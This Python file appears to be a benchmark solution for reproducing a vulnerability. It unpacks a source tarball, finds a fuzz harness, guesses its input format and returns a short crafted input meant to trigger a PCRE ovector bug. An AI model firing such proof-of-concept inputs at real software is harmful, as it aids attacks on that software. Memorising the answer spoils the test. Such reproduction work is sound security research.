import os
import re
import tarfile
import tempfile
from typing import Optional


class Solution:
    def _extract(self, src_path: str) -> str:
        tmpdir = tempfile.mkdtemp(prefix="src_")
        with tarfile.open(src_path, "r:*") as tar:
            def is_within_directory(directory, target):
                abs_directory = os.path.abspath(directory)
                abs_target = os.path.abspath(target)
                prefix = os.path.commonprefix([abs_directory, abs_target])
                return prefix == abs_directory

            def safe_extract(tarobj, path="."):
                for member in tarobj.getmembers():
                    member_path = os.path.join(path, member.name)
                    if not is_within_directory(path, member_path):
                        continue
                    tarobj.extract(member, path)

            safe_extract(tar, tmpdir)
        return tmpdir

    def _read_text(self, path: str) -> Optional[str]:
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                return f.read()
        except Exception:
            return None

    def _find_harness_file(self, root: str) -> Optional[str]:
        # Search for a file containing LLVMFuzzerTestOneInput
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if not fn.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")):
                    continue
                full = os.path.join(dirpath, fn)
                txt = self._read_text(full)
                if not txt:
                    continue
                if "LLVMFuzzerTestOneInput" in txt:
                    return full
        return None

    def _detect_input_format(self, harness_text: str) -> str:
        ht = harness_text

        # Prefer formats that separate pattern/subject by NUL
        if re.search(r'memchr\s*\(\s*[^,]+,\s*0\s*,', ht) or "\\0" in ht or "'\\0'" in ht or '"\\0"' in ht:
            return "null_delim"

        # Detect first-byte delimiter style
        if re.search(r'data\s*\[\s*0\s*\]', ht) and "memchr" in ht and re.search(r'memchr\s*\(\s*[^,]+data\s*\+\s*1', ht):
            return "first_byte_delim"

        # Detect newline-delimited split
        if re.search(r'\\n', ht) and ("find" in ht or "memchr" in ht):
            return "newline_delim"

        # If it's clearly PCRE and uses strings without explicit delimiter search, assume NUL-delim (common OSS-Fuzz style)
        if ("pcre.h" in ht or "pcre_exec(" in ht or "pcre2.h" in ht or "pcre2_match(" in ht) and ("std::string(" in ht or "string(" in ht):
            return "null_delim"

        # Fallback
        return "null_delim"

    def _craft_payload(self, fmt: str) -> bytes:
        # We want a match with fewer capturing groups than the ovector size.
        # Use pattern 'a' (0 capturing groups) and subject 'a'.
        # Target length around 8 bytes to satisfy potential size guards.
        if fmt == "null_delim":
            base = b"a\x00a"
            # pad to 8 bytes for robustness, won't affect typical parsers
            if len(base) < 8:
                base += b"A" * (8 - len(base))
            return base[:8]
        elif fmt == "first_byte_delim":
            # First byte is delimiter, craft: '|' + 'a' + '|' + 'a'
            base = b"|" + b"a" + b"|" + b"a"
            if len(base) < 8:
                base += b"A" * (8 - len(base))
            return base[:8]
        elif fmt == "newline_delim":
            base = b"a\na"
            if len(base) < 8:
                base += b"A" * (8 - len(base))
            return base[:8]
        else:
            # Default robust payload
            base = b"a\x00a"
            if len(base) < 8:
                base += b"A" * (8 - len(base))
            return base[:8]

    def solve(self, src_path: str) -> bytes:
        root = None
        try:
            root = self._extract(src_path)
            harness = self._find_harness_file(root)
            if harness:
                txt = self._read_text(harness) or ""
                fmt = self._detect_input_format(txt)
            else:
                fmt = "null_delim"
            payload = self._craft_payload(fmt)
            return payload
        except Exception:
            # Safe fall-back payload
            base = b"a\x00a"
            if len(base) < 8:
                base += b"A" * (8 - len(base))
            return base[:8]
        finally:
            # Best-effort cleanup
            if root and os.path.isdir(root):
                for dirpath, dirnames, filenames in os.walk(root, topdown=False):
                    for fn in filenames:
                        try:
                            os.remove(os.path.join(dirpath, fn))
                        except Exception:
                            pass
                    for dn in dirnames:
                        try:
                            os.rmdir(os.path.join(dirpath, dn))
                        except Exception:
                            pass
                try:
                    os.rmdir(root)
                except Exception:
                    pass
